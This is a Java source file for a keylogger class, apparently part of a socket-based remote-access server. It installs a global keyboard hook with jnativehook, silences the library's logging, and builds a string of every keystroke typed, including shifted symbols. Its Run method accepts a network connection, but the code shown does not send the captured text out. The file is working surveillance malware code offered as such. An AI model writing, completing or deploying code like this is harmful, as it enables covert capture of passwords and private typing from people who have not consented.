package socket_server;

import java.io.*;
import java.net.Socket;
import java.net.ServerSocket;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class keyloger implements NativeKeyListener{
    public static String result = "" ;
    private boolean shift = false;
    
    public void Run(Socket socket, ServerSocket server) throws IOException{
        socket.close();
        socket = server.accept();
        try {
            GlobalScreen.registerNativeHook();           
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        
        GlobalScreen.addNativeKeyListener(new keyloger());
        
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
    }

@Override
    public void nativeKeyPressed(NativeKeyEvent key) {
           String pressed = NativeKeyEvent.getKeyText(key.getKeyCode());
	if (pressed.equals("Shift"))
		 shift = true;

	if (key.isActionKey())
        result += "";
	else if (pressed.equals("Backspace"))
		result += "[Back]";
	else if (pressed.equals("Space"))
		result += " ";
	else if (pressed.equals("Tab"))
		result += "\t";
	else if (pressed.equals("Enter"))
		result += "\n";
	else if (shift) {
		if (pressed.matches("[A-Z]")){
                    result += pressed;
                    shift =false;
                }         
		else if (pressed.equals("1")){
                   result +="!";
                    shift =false;
                }
			
		else if (pressed.equals("2")){
                       result += "@";
                        shift =false;
                        }
			
		else if (pressed.equals("3")){
                        result += "#";
                        shift =false;
                        }
			
		else if (pressed.equals("4")){
                       result += "$";
                        shift =false;
                        }
			
		else if (pressed.equals("5")){
                        result += "%";
                        shift =false;
                        }
			
		else if (pressed.equals("6")){
                       result +="^";
                        shift =false;
                        }
			
		else if (pressed.equals("7")){
                       result +="&";
                        shift =false;
                        }
			
		else if (pressed.equals("8")){
                       result +="*";
                        shift =false;
                        }
			
		else if (pressed.equals("9")){
                       result +="(";
                        shift =false;
                        }
			
		else if (pressed.equals("0")){
                       result +=")";
                        shift =false;
                        }
			
		else if (pressed.equals("Minus")){
                       result +="_";
                        shift =false;
                        }
			
		else if (pressed.equals("Equals")){
                       result +="+";
                        shift =false;
                        }
			
		else if (pressed.equals("Open Bracket")){
                       result +="{";
                        shift =false;
                        }
			
		else if (pressed.equals("Close Bracket")){
                       result +="}";
                        shift =false;
                        }
			
		else if (pressed.equals("Back Slash")){
                       result +="|";
                        shift =false;
                        }
			
		else if (pressed.equals("Semicolon")){
                       result +=":";
                        shift =false;
                        }
			
		else if (pressed.equals("Quote")){
                       result +="\"";
                        shift =false;
                        }
			
		else if (pressed.equals("Comma")){
                       result +="<";
                        shift =false;
                        }
			
		else if (pressed.equals("Period")){
                       result +=">";
                        shift =false;
                        }
		
		else if (pressed.equals("Dead Acute")){
                       result +="?";
                        shift =false;
                        }
			
		else if (pressed.equals("Back Quote")){
                       result +="~";
                        shift =false;
                        }
			
	} else {
		if (pressed.matches("[a-zA-Z0-9]"))
			result +=pressed.toLowerCase();
		else if (pressed.equals("Minus"))
			result +="-";      
		else if (pressed.equals("Equals"))
			result +="=";
		else if (pressed.equals("Open Bracket"))
			result +="[";
		else if (pressed.equals("Close Bracket"))
			result +="]";
		else if (pressed.equals("Back Slash"))
			result +="\\";
		else if (pressed.equals("Semicolon"))
			result +=";";
		else if (pressed.equals("Quote"))
			result +="'";
		else if (pressed.equals("Comma"))
			result +=",";
		else if (pressed.equals("Period"))
			result +=".";
		else if (pressed.equals("Dead Acute"))
			result +="/";
		else if (pressed.equals("Back Quote"))
			result +="`";
	}
    }
    
@Override
    public void nativeKeyReleased(NativeKeyEvent e) {
     //  System.out.println( "Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

@Override
    public void nativeKeyTyped(NativeKeyEvent e) {   
        
    }
    
    public void hook() {
        
    }
}